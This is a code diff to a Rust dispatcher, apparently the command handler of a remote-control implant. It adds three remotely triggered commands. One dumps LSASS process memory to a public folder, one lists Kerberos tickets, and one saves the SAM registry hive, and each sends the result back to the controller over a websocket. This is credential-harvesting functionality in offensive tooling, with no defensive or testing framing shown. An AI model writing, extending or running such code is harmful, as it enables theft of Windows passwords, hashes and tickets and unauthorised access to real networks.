@@ -265,6 +265,26 @@ pub(crate) async fn dispatch(
             })).await;
             ws_send(tx, &agent_id, "othersoft.rdp.result", &r, rid).await;
         }
+        ws_type::OTHERSOFT_LSASS => {
+            let path = data_str(&data, "path", "C:\\Users\\Public\\lsass.dmp");
+            let r = run_module(module_manager, "creds", serde_json::json!({
+                "op": "lsass", "path": path
+            })).await;
+            ws_send(tx, &agent_id, "othersoft.lsass.result", &r, rid).await;
+        }
+        ws_type::OTHERSOFT_KLIST => {
+            let r = run_module(module_manager, "creds", serde_json::json!({
+                "op": "klist"
+            })).await;
+            ws_send(tx, &agent_id, "othersoft.klist.result", &r, rid).await;
+        }
+        ws_type::OTHERSOFT_SAM => {
+            let dir = data_str(&data, "dir", "C:\\Users\\Public");
+            let r = run_module(module_manager, "creds", serde_json::json!({
+                "op": "sam", "dir": dir
+            })).await;
+            ws_send(tx, &agent_id, "othersoft.sam.result", &r, rid).await;
+        }
 
         // ── Proxy (cloud module) ─────────────────────────────
         ws_type::PROXY_FETCH => {
